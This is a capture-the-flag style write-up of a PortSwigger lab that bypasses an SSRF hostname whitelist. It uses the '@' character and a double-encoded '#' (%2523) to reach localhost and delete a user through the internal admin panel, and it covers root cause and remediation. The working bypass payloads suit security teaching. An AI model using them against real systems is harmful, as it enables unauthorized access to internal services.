# PortSwigger Lab: SSRF with whitelist-based input filter

**TAGS:** SSRF, Server-Side Request Forgery, Whitelist Bypass, URL Encoding, Burp Suite

**Category:** SSRF  
**Date:** November 11, 2026  
**Day:** Wednesday  
**Link:** https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter  
**Published:** Ready  
**Status:** Done

---

## Intro

This is the fourth lab in the SSRF series. In the previous lab, the application used a blacklist to block requests to internal services. This time, it uses a whitelist, which should be a stronger defense.

The stock check feature only accepts URLs pointing to `stock.weliketoshop.net`. But there is a problem: URLs can be interpreted differently depending on how they are parsed and decoded.

In this lab, I used URL encoding and the `@` character to bypass the whitelist and reach the internal admin interface.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance

#### Lab Description Lookup

The lab description says the stock check functionality is protected by a whitelist. The goal is to bypass it, access the internal admin interface, and delete the user `carlos`.

I opened a product page, clicked **Check stock**, and intercepted the request:

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

The `stockApi` parameter contains the URL the server uses to check the stock.

I sent the request to Repeater and changed the URL to:

```text
http://127.0.0.1/
```

The server rejected it:

```http
HTTP/2 400 Bad Request

"External stock check host must be stock.weliketoshop.net"
```

Unlike the previous lab, the application was not simply blocking known internal addresses. It required a specific hostname.

I needed to find a way around that restriction.

---

## Exploitation

#### Step 1: Testing the `@` character

I started by investigating how the application handled the `@` character.

In a URL, `@` separates optional user information from the actual hostname.

For example:

```text
http://username@hostname/
```

The hostname is the part after `@`.

I first tried:

```text
http://stock.weliketoshop.net@127.0.0.1/
```

The server rejected it with the same error.

That made sense. The actual hostname was still `127.0.0.1`.

Then I reversed the order:

```text
http://127.0.0.1@stock.weliketoshop.net/
```

This time, the response changed:

```http
HTTP/2 500 Internal Server Error
```

```text
Could not connect to external stock check service
```

Interesting.

The request was no longer being rejected because of the hostname. It appeared to pass the whitelist check, but the server could not connect to the destination.

This suggested that the application was checking the hostname after the `@` character.

#### Step 2: Testing URL fragments

Next, I investigated the `#` character.

In a URL, `#` marks the beginning of a fragment.

I tried:

```text
http://127.0.0.1#@stock.weliketoshop.net/
```

The server rejected it.

I also tried encoding the fragment character:

```text
http://127.0.0.1%23@stock.weliketoshop.net/
```

Another `400 Bad Request`.

The filter was still blocking the request.

But this raised another question: what if the application decoded the URL more than once?

#### Step 3: Double encoding

URL encoding represents special characters using percent-encoded values.

For example:

```text
# = %23
% = %25
```

If I encode the percent sign in `%23`, I get:

```text
%2523
```

This is double encoding.

It matters because the application may decode the form parameter before validating the URL, while another component may decode it again before making the request.

I tested:

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.0.0.1%2523@stock.weliketoshop.net/
```

This time, the server returned:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
```

The response contained the HTML of the application's storefront, including:

```html
<a href="/admin">Admin panel</a>
```

That was a significant change.

Instead of rejecting the hostname, the application returned a page from the local web application.

The double-encoded fragment appeared to have bypassed the whitelist.

#### Step 4: Understanding why it worked

The interesting part is how the URL changes during decoding.

I submitted:

```text
http://127.0.0.1%2523@stock.weliketoshop.net/
```

After the form parameter is decoded once, the value becomes:

```text
http://127.0.0.1%23@stock.weliketoshop.net/
```

At this point, the hostname appears to be:

```text
stock.weliketoshop.net
```

That matches the whitelist.

But if another component decodes `%23` into `#` and interprets the URL again, the result is:

```text
http://127.0.0.1#@stock.weliketoshop.net/
```

Now the hostname is `127.0.0.1`.

The application appears to validate one interpretation of the URL but use another when making the request.

This is a URL parsing inconsistency.

I could not see the application's internal code, but the different responses were consistent with this behavior.

#### Step 5: Delete carlos

After reaching the storefront, I continued testing the internal admin functionality.

The final payload was:

```text
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

The server responded:

```http
HTTP/2 302 Found
Location: /admin
Content-Length: 0
```

The redirect was consistent with the admin deletion endpoint.

The lab then displayed **Solved**, confirming that the objective had been completed.

---

## Root Cause

The application uses a whitelist to restrict the stock check URL to `stock.weliketoshop.net`.

However, the validation does not reliably ensure that the URL approved by the filter points to the same destination used by the outgoing request.

The bypass combines two URL features:

- The `@` character, which separates user information from the hostname.
- The double-encoded fragment character `%2523`, which can be interpreted differently across decoding stages.

The observed behavior is consistent with the application validating the hostname before another component decodes or reinterprets the URL.

As a result, a URL that appears to point to an approved hostname can cause the server to contact an internal service.

The problem is not the whitelist itself. It is the inconsistent interpretation of the URL.

---

## Impact

An attacker who bypasses an SSRF whitelist may be able to reach internal services that are not accessible from the internet.

These services may include administrative interfaces, internal APIs, databases, and cloud metadata endpoints.

In this lab, the bypass allowed me to reach an administrative function and delete a user.

In a real application, the same vulnerability could expose sensitive information or allow unauthorized operations against internal systems.

---

## Remediation

To prevent this issue, applications should:

- Use a strict allowlist of permitted destinations.
- Parse and normalize URLs consistently before validation.
- Reject ambiguous URLs and unnecessary userinfo components.
- Avoid decoding and reinterpreting URLs after they have been validated.
- Verify that the final resolved destination is permitted, including after redirects.
- Restrict access to localhost, private networks, and cloud metadata services at the network level.
- Enforce authentication and authorization on internal administrative endpoints.

A whitelist is only effective when the destination being validated is the same destination the server actually contacts.

---

## Key Takeaways

1. A whitelist is stronger than a blacklist, but it can still fail when URL parsing is inconsistent.
2. The `@` character separates user information from the hostname.
3. Double encoding can expose differences between validation and request processing.
4. Changes in HTTP responses help identify which restrictions are being triggered.
5. Failed payloads are useful because they reveal how the application handles URLs.
6. Always validate the final destination, not just the original URL string.

---

## References

- PortSwigger — Server-side request forgery (SSRF): https://portswigger.net/web-security/ssrf
- PortSwigger — SSRF with whitelist-based input filter (lab): https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter
- OWASP — Server-Side Request Forgery: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.